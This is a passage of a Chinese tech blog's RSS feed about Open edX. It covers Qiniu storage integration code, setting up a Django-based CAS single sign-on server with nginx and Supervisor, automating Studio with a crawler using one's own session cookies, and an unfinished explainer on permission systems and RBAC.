&lt;span class="nd"&gt;@api_view&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;post_from_qiniu&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="n"&gt;origin_authorization&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;META&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;HTTP_AUTHORIZATION&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="n"&gt;access_key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;re&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;r&amp;#39;\W&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;origin_authorization&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
            &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;file_url&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://media.xxx.com/&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;file_key&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
            &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;file_size&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;file_size&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
            &lt;span class="n"&gt;serializer&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;  &lt;span class="n"&gt;QiniuFilesSerializer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;access_key&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;Qiniu&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;access_key&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="n"&gt;serializer&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;is_valid&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
                &lt;span class="n"&gt;serializer&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;save&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="c1"&gt;#把信息存储到qiniu_storage模型里&lt;/span&gt;
                &lt;span class="n"&gt;instance&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;serializer&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;save&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
                &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;file_info_format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                &lt;span class="c1"&gt;#使用序列化就能存入本地&lt;/span&gt;
                &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;instance&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pk&lt;/span&gt;
                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;Response&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;Response&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;success&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;u&amp;quot;请求不合格&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;todo&lt;/h1&gt;
&lt;p&gt;还有许多细节可以改进，诸如校验用户是否有教师权限&lt;/p&gt;
&lt;h1&gt;后记&lt;/h1&gt;
&lt;p&gt;上边实际给出了open edx集成外部存储的方式，思路是通用的，不限于七牛。诸如你也可以将你自建的视频存储集成到open edx中，区别仅在抽象的存储接口（我们可以用minio构建）&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 13 Sep 2016 00:00:00 +0000</pubDate><guid>tag:,2016-09-13:open-edx-qiniu.html</guid><category>edx</category></item><item><title>基于django的cas服务器</title><link>/django_cas_server_lite.html</link><description>&lt;p&gt;之前为某高校写的一个简易cas server，基于django实现，先上源码:&lt;a href="https://github.com/wwj718/django_cas_server_lite"&gt;django_cas_server_lite&lt;/a&gt; &lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;不想折腾java/tomcat/apache，所以没选用&lt;a href="https://github.com/apereo/cas"&gt;apereo/cas&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;利用django的认证机制易于与任何认证系统对接，包括数据库，以及jwt等&lt;/li&gt;
&lt;li&gt;没有历史负担，方便页面样式设计&lt;/li&gt;
&lt;li&gt;跟Open edX采用同一套技术栈&lt;/li&gt;
&lt;li&gt;默认不采用https,方便开发，需要的话，采用nginx反向代理来做https&lt;/li&gt;
&lt;li&gt;why not&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;使用&lt;/h1&gt;
&lt;p&gt;把当前项目run起来后，访问&lt;code&gt;/django_cas/login&lt;/code&gt;即可。具体细节如下&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="https://camo.githubusercontent.com/a82dba1e5e8743024bb374f3ab02db634d9a9d71/687474703a2f2f3778726334682e636f6d312e7a302e676c622e636c6f7564646e2e636f6d2f6361732e6a7067" /&gt;&lt;/p&gt;
&lt;h3&gt;安装&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;git clone https://github.com/wwj718/django_cas_server_lite&lt;/li&gt;
&lt;li&gt;virtualenv cas_env&lt;/li&gt;
&lt;li&gt;. cas_env/bin/activate.fish&lt;/li&gt;
&lt;li&gt;cd django_cas_server_lite&lt;/li&gt;
&lt;li&gt;pip install -r requirements.txt //如果网络不便，也可以手动安装 requirements.txt里的依赖，我已经把依赖控制到最精简了&lt;/li&gt;
&lt;li&gt;跑起来&lt;ul&gt;
&lt;li&gt;开发调试状态：&lt;code&gt;python manage.py runserver&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;生产环节：&lt;code&gt;gunicorn django_cas_server_lite.wsgi:application --bind 127.0.0.1:8001 -w 4&lt;/code&gt; , &lt;code&gt;-w 4&lt;/code&gt; 表示4个worker，之后用nginx反向代理。gunicorn可以先跑在tmux里，如果需要将其设为守护进程，使用Supervisor&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;nginx配置&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;server {
        listen 80;             #端口
        server_name cas.just4fun.site;   #访问域名
        access_log /tmp/access.log;
        error_log /tmp/access.log;
        location / {
                proxy_set_header X-Forward-For $proxy_add_x_forwarded_for;
                proxy_set_header Host $http_host;
                proxy_redirect off;
                if (!-f $request_filename) {
                        proxy_pass http://127.0.0.1:8001;  #这里是django应用的gunicorn端口
                        break;
                }
        }
}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;如果需要使用https（推荐），参考:&lt;a href="http://blog.just4fun.site/https-note.html"&gt;使用Let’s Encrypt(certbot)为你的网站生成免费的 SSL 证书&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;nginx&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;server {
        listen 80;             #端口
        server_name cas.just4fun.site;   #访问域名
        #root /home/bob/dylan/;
        access_log /tmp/access.log;
        error_log /tmp/access.log;
        location / {
                proxy_set_header X-Forward-For $proxy_add_x_forwarded_for;
                proxy_set_header Host $http_host;
                proxy_redirect off;
                if (!-f $request_filename) {
                        proxy_pass http://127.0.0.1:8001;  #这里是flask应用的gunicorn端口
                        break;
                }
        }
}
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;Open edX用户&lt;/h1&gt;
&lt;p&gt;如果你未使用Open edX，可以忽视这条&lt;/p&gt;
&lt;p&gt;如果你使用Open edX，你可以利用Open edX的edxapp env，这样一来依赖都是完备的&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;git clone https://github.com/wwj718/django_cas_server_lite
&lt;span class="nb"&gt;cd&lt;/span&gt; django_cas_server_lite
. /edx/app/edxapp/edxapp_env
gunicorn django_cas_server_lite.wsgi:application --bind 127.0.0.1:8001 -w &lt;span class="m"&gt;4&lt;/span&gt; &lt;span class="c1"&gt;# 这一步可选，推荐使用Supervisor，见下文&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Supervisor配置&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;[program:cas]&lt;/span&gt;

&lt;span class="na"&gt;command&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;/edx/app/edxapp/venvs/edxapp/bin/gunicorn django_cas_server_lite.wsgi:application&lt;/span&gt;

&lt;span class="na"&gt;user&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;www-data&lt;/span&gt;
&lt;span class="na"&gt;directory&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;/edx/app/edxapp/django_cas_server_lite&lt;/span&gt;
&lt;span class="na"&gt;environment&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;PORT=8001,ADDRESS=127.0.0.1,LANG=en_US.UTF-8,PATH=&amp;quot;/edx/app/edxapp/venvs/edxapp/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&amp;quot;&lt;/span&gt;
&lt;span class="na"&gt;stdout_logfile&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;/edx/var/log/supervisor/%(program_name)s-stdout.log&lt;/span&gt;
&lt;span class="na"&gt;stderr_logfile&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;/edx/var/log/supervisor/%(program_name)s-stderr.log&lt;/span&gt;
&lt;span class="na"&gt;killasgroup&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;true&lt;/span&gt;
&lt;span class="na"&gt;stopasgroup&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;true&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;之后配置nginx即可，同上&lt;/p&gt;
&lt;h1&gt;设计&lt;/h1&gt;
&lt;h3&gt;需求&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;实现类似apereo/cas的功能，能对接到其他认证后端&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;思路&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;采用django的Authenticate机制,写自己的认证后端&lt;/li&gt;
&lt;li&gt;关注REMOTE_USER，主要使用单点登录解决方案&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;核心依赖&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/jbittel/django-mama-cas"&gt;django-mama-cas&lt;/a&gt;：A Django Central Authentication Service (CAS) single sign-on server&lt;ul&gt;
&lt;li&gt;It implements the CAS 1.0, 2.0 and 3.0 protocols&lt;/li&gt;
&lt;li&gt;&lt;a href="http://django-mama-cas.readthedocs.io/en/latest/"&gt;Documentation&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;笔记&lt;/h1&gt;
&lt;h3&gt;&lt;a href="http://django-mama-cas.readthedocs.io/en/latest/installation.html#authenticating"&gt;Authenticating&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;One or more &lt;a href="https://pypi.python.org/pypi?:action=browse&amp;amp;show=all&amp;amp;c=475&amp;amp;c=523"&gt;authentication backends&lt;/a&gt; must be &lt;a href="https://docs.djangoproject.com/en/dev/topics/auth/customizing/#specifying-authentication-backends"&gt;installed and configured&lt;/a&gt; based on your authoritative authentication sources&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://zh.wikibooks.org/zh/Django/%E7%94%A8%E6%88%B7%E8%AE%A4%E8%AF%81#.E6.8C.87.E5.AE.9A.E8.AE.A4.E8.AF.81.E5.90.8E.E7.AB.AF"&gt;Django/用户认证&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://python.usyiyi.cn/django/topics/auth/customizing.html"&gt;在Django中自定义身份验证&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;AUTHENTICATION_BACKENDS 的顺序很重要，所以如果用户名和密码在多个后台中都是合法的，Django 将在第一个匹配成功后停止处理。如果后台引发PermissionDenied 异常，认证将立即失败。Django 不会检查后面的认证后台。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;todo&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;是remote database backend变为可选功能，采用配置文件实现&lt;/li&gt;
&lt;li&gt;与LDAP对接（LDAP 3.0）&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/cannatag/ldap3"&gt;ldap3&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/django-ldapdb/django-ldapdb"&gt;django-ldapdb&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;相关项目&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/wwj718/django_cas_server_demo"&gt;django_cas_server_demo&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/wwj718/django_cas_server_lite"&gt;django_cas_server_lite&lt;/a&gt; ： 目前主要推进这个&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Fri, 09 Sep 2016 00:00:00 +0000</pubDate><guid>tag:,2016-09-09:django_cas_server_lite.html</guid><category>edx</category></item><item><title>爬虫视角下的open edx studio</title><link>/edx-studio-spider.html</link><description>&lt;h1&gt;studio&lt;/h1&gt;
&lt;p&gt;按官方说法：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Studio是课程制作系统，课程团队使用它来创建和更新课程。Studio将课程内容写入到Mongo数据库中，之后LMS从中读取课程内容&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;参考我的译文：&lt;a href="http://blog.just4fun.site/Open-edX-Architecture-Translation.html"&gt;Open edX体系架构&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;架构&lt;/h3&gt;
&lt;p&gt;从技术角度来看，studio是个web服务，而且是个前端很重的web服务（mvc/模块化）。edx的课程制作后台，复杂而强大，官方好像并不认为适合用移动端来做，他们压根没构建RESTful接口&lt;/p&gt;
&lt;h1&gt;需求&lt;/h1&gt;
&lt;p&gt;随着对平台的深入了解和使用，我们可能会想把一些重复性的劳动自动化，诸如批量构建课程、批量备份、批量添加老师、批量构建结构化课程。人力来做的麻烦除了耗费精力，还容易出错&lt;/p&gt;
&lt;p&gt;如何使studio可编程控制，是一个随着使用深入可能遇到的需求&lt;/p&gt;
&lt;h1&gt;思路&lt;/h1&gt;
&lt;p&gt;这个问题，我最初的想法是翻后台源码，看看它们的实现，看看是否有可能引出资源的RESTful接口，只要有小而美的接口，组合它们来完成任务就不麻烦&lt;/p&gt;
&lt;p&gt;切入点从前端入手，之后跟踪请求，找到请求的后端实现，然后重新封装实现，引为外部接口，这部分的探索你可以从我的&lt;a href="https://github.com/wwj718/edx_siteapi"&gt;edx_siteapi&lt;/a&gt;提交记录中看到&lt;/p&gt;
&lt;p&gt;后来偶然的机会在github上看到@&lt;a href="https://github.com/pmitros"&gt;pmitros&lt;/a&gt;的实现:&lt;a href="https://github.com/pmitros/edx-rest"&gt;edx-rest&lt;/a&gt;，pmitros来自mit，是edx项目的首席科学家、创始人之一，他采用了爬虫的思路&lt;/p&gt;
&lt;h1&gt;爬虫视角&lt;/h1&gt;
&lt;p&gt;爬虫爬取一个页面，通常是为了采集数据，爬取的过程常常会涉及与页面交互，点击以获取更多数据或是进入其他链接，而我们在一个页面中点击操作完成任务，常常也是点击链接的过程，如此一来爬虫与页面的交互，很自然地被用来自动化完成任务（很像批处理）&lt;/p&gt;
&lt;p&gt;对服务器来说，爬虫对页面的操作，与用户的操作不可区分（等效），这么一来，理论上，任何能在open edx studio里做的事，都能采用爬虫完成&lt;/p&gt;
&lt;p&gt;说到爬虫,最近edx官方源码库出现了一个活跃的爬虫项目：&lt;a href="https://github.com/edx/pa11ycrawler"&gt;pa11ycrawler&lt;/a&gt;，基于Scrapy，用于检测页面的可访问性（是否挂掉）&lt;/p&gt;
&lt;p&gt;多说一句，如果你想反爬虫，尤其是对付那些会动态ip切换的老手的话，可以使用机器学习观察他们的行为模式（我在一些技术会议上遇到过这么做的公司）&lt;/p&gt;
&lt;h3&gt;技术细节&lt;/h3&gt;
&lt;p&gt;我们知道studio需要登录，所以爬虫需要伪造为有效用户，你需要使用浏览器取得当前账号的csrftoken和sessionid，之后爬虫就会以你的身份去和服务器交互。如果你对http协议熟悉，了解cookie/session的概念，你知道只要我们取得cookie，就可以伪装成用户身份。许多著名的网络攻击都用到cookie&lt;/p&gt;
&lt;p&gt;当我们能用程序伪装为浏览器时，剩下的细节就是找到功能对应的请求，分析http请求，并仿造即可(chrome调试工具里的network会帮上大忙)&lt;/p&gt;
&lt;h3&gt;这样做的好处&lt;/h3&gt;
&lt;p&gt;采用爬虫来使studio可编程的好处很多：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;非侵入。我们获得这些功能的同时，没有入侵源码&lt;/li&gt;
&lt;li&gt;操作直接，简易。不涉及open edx的内部逻辑&lt;/li&gt;
&lt;li&gt;权限合理，因为爬虫模拟的用户是合法用户，爬虫权限和用户一致，这样一来，爬虫的改进可以是自下而上的，不需要网站管理员干预&lt;/li&gt;
&lt;li&gt;易于分发，爬虫实际是python包，可以运行在任何能联网的机器上&lt;/li&gt;
&lt;li&gt;用户自主，用户可以自行为studio的操作编程&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;后来我的&lt;a href="https://github.com/wwj718/edx_siteapi"&gt;edx_siteapi&lt;/a&gt;和&lt;a href="https://github.com/wwj718/course_backup"&gt;course_backup&lt;/a&gt;都推翻原有设计，采用基于&lt;a href="https://github.com/pmitros/edx-rest"&gt;edx-rest&lt;/a&gt;的方式来构建&lt;/p&gt;
&lt;h1&gt;我的补充&lt;/h1&gt;
&lt;p&gt;&lt;a href="https://github.com/pmitros/edx-rest"&gt;edx-rest&lt;/a&gt;只支持studio，我把爬虫对接到lms：&lt;a href="https://github.com/wwj718/edx_siteapi/blob/master/edx_lms_rest.py"&gt;edx_lms_rest.py&lt;/a&gt;，如此一来，lms上能在网页上操作的项目，也都能由爬虫自动化完成了&lt;/p&gt;
&lt;p&gt;我给出了往课程里批量化注册学生的例子，并且封装为RESTful服务,使用方法也给出了:&lt;a href="https://github.com/wwj718/edx_siteapi#enrollment批量选课课程创建时"&gt;enrollment批量选修课程&lt;/a&gt;，细节看源码&lt;/p&gt;
&lt;h1&gt;其他思路&lt;/h1&gt;
&lt;p&gt;如果你对 爬虫/http请求 不熟悉，可能会觉得让爬虫模拟浏览器不是建轻松的工作，教你另一种巧妙的方式：使用自动化测试工具，
下边是我们常用的工具，即便对那些熟悉爬虫的人来说，遇到前端特别复杂的页面，他们也偏好这些工具&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;PhantomJS&lt;/li&gt;
&lt;li&gt;webdriver/selenium&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 08 Sep 2016 00:00:00 +0000</pubDate><guid>tag:,2016-09-08:edx-studio-spider.html</guid><category>edx</category></item><item><title>理解权限系统</title><link>/understand-permission.html</link><description>&lt;blockquote&gt;
&lt;p&gt;现实世界只不过是反射出了更高层次的世界的阴影   --- 柏拉图 &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;计算机世界中的许多事物是现实世界的一个投影，现实中所见的许多模式/概念在计算机世界里都能找到&lt;/p&gt;
&lt;p&gt;&lt;code&gt;权限&lt;/code&gt;作为现实世界随处可见的概念，在我们谈论&lt;code&gt;私有制&lt;/code&gt;、&lt;code&gt;所有权&lt;/code&gt;时，时常会谈及权限，在计算机世界中，权限在许多系统中举足轻重&lt;/p&gt;
&lt;p&gt;曾记否，qq里隐身对她可见，怕她看不见，下线又上线，却依旧被视而不见&lt;br /&gt;
曾记否，好好的一个熟人，说做微商就做微商，痛心疾首，火速拉黑&lt;/p&gt;
&lt;p&gt;上述的这些，都是利用权限系统的典型案例，在qq隐身案例中，你对女神隐身可见，实际上是赋予了她可以看到你的隐身状态（真实状态）的权限；当然你也赋予了人家伤害你的权限&lt;/p&gt;
&lt;p&gt;在朋友圈中的案例中，你把微商拉到了&lt;code&gt;黑名单&lt;/code&gt;用户组，这样一来，他们就没有看到你的状态的权限，你也看不到他的刷屏&lt;/p&gt;
&lt;p&gt;下边我们将以几个案例来帮助理解权限系统的概念和设计，这些案例包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;linux操作系统中的权限系统&lt;/li&gt;
&lt;li&gt;微信朋友圈中的权限&lt;/li&gt;
&lt;li&gt;django中的权限机制&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;近期工作中遇到一个系统设计中关于权限的复杂问题（层级组织），本文是我学习权限系统及对此思考的一个小结&lt;/p&gt;
&lt;h1&gt;linux中的权限系统&lt;/h1&gt;
&lt;p&gt;关于权限系统，我们以linux为切入点，它为大多技术人员所熟悉。我们重点关注其中的概念，而对实现细节不做深究&lt;/p&gt;
&lt;p&gt;linux是个多用户操作系统，这每个用户有自己的工作空间(home目录)。就好比多人住在一套公寓里，各自有自己的房间。&lt;/p&gt;
&lt;p&gt;在linux中&lt;code&gt;一切皆文件&lt;/code&gt;，linux鼓励使用文本文件，人和机器能理解文本文件，成为人与机器交流的最好途径。在linux中权限问题往往最终会落到文件的权限上。&lt;/p&gt;
&lt;p&gt;如果我们把文件视为一种资源。那么我们会发现 权限往往围绕这些概念：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用户&lt;/li&gt;
&lt;li&gt;用户组（群组）&lt;/li&gt;
&lt;li&gt;资源&lt;/li&gt;
&lt;li&gt;权限类型&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果你对上述概念不大熟悉，推荐阅读鸟哥的&lt;a href="http://cn.linux.vbird.org/linux_basic/0210filepermission.php#UserandGroup"&gt;Linux 的文件权限与目录配置&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;上边几个概念中，鸟哥对用户组的解释很棒（意义和功能），推荐一读&lt;/p&gt;
&lt;p&gt;总结来说，Linux一般将文件关联的身份分为三个类别，分别是 owner/group/others，且三种身份各有 read/write/execute 权限&lt;/p&gt;
&lt;p&gt;我们举个本地文件的例子&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ls -l /tmp/test.txt
&lt;span class="c1"&gt;# -rw-r--r--  1 wwj  wheel  235103  9  7 10:26 /tmp/test.txt&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;我们在此引用鸟哥文章里的这张图&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://cn.linux.vbird.org/linux_basic/0210filepermission_files/0210filepermission_3.gif" /&gt;&lt;/p&gt;
&lt;p&gt;上述信息表示：文件&lt;code&gt;/tmp/test.txt&lt;/code&gt;是文件(&lt;code&gt;-&lt;/code&gt;)，文件拥有者(wwj)的权限为&lt;code&gt;rw-&lt;/code&gt;(读写)，文件拥有群组(wheel)的权限为&lt;code&gt;r--&lt;/code&gt;(读)，其他人的权限为&lt;code&gt;r--&lt;/code&gt;(读)&lt;/p&gt;
&lt;p&gt;如果你想改变文件属性与权限，可以使用：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;chgrp ：改变文件所属群组&lt;/li&gt;
&lt;li&gt;chown ：改变文件拥有者&lt;/li&gt;
&lt;li&gt;chmod ：改变文件的权限&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;有了群组/资源/用户这些概念，之后我们就可以这样表达权限了: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A用户有资源B的可读权限(r)&lt;/li&gt;
&lt;li&gt;群组X有资源Y的可读权限(r)&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;朋友圈中的分组与权限&lt;/h1&gt;
&lt;p&gt;在用户/群组/资源/权限类型的视角下，我们可以这样理解微信朋友圈的分组功能：&lt;/p&gt;
&lt;p&gt;你半夜回家发了一条: &lt;code&gt;今天大学聚会很开心&lt;/code&gt;，为了让没到现场的同学也看到聚会情况，于是附上了聚会照片，你怕被小伙伴诟病为&lt;code&gt;天天晒吃的&lt;/code&gt;，于是决定这条消息只对&lt;code&gt;大学同学组&lt;/code&gt;可见,这样只有在&lt;code&gt;大学同学组(群组)里的同学(用户)才能看到(可读权限)聚会消息(资源)&lt;/code&gt;&lt;/p&gt;
&lt;h1&gt;RBAC&lt;/h1&gt;
&lt;p&gt;如果我们进一步抽象，我们便总结出了&lt;code&gt;基于角色的访问控制&lt;/code&gt;(Role-Based Access Control，RBAC)&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Who对What进行How操作&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;我们可以看到这种模式：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;大学同学组里的同学(who)才能看到(how)聚会消息(what)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;RBAC认为权限授权实际上是Who、What、How的问题&lt;/p&gt;
&lt;p&gt;在RBAC模型中，who、what、how构成了访问权限三元组,也就是&lt;code&gt;Who对What进行How的操作&lt;/code&gt;，各个要素的含义如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Who：权限的拥用者或主体（如User、Group、Role）&lt;/li&gt;
